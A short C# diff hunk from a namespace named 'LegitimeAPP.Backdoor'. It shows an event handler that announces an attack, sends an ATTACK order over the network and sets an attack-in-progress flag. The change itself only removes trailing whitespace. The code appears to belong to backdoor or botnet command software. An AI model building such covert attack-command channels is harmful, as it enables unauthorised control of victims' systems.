@@ -52,7 +52,7 @@ namespace LegitimeAPP.Backdoor {
             order.NewAttackOrder += delegate {
                 Console.WriteLine("L'attaque est on") ;
 
-                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ; 
+                WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ;
 
                 _attackInProgress = true ; 
             } ;
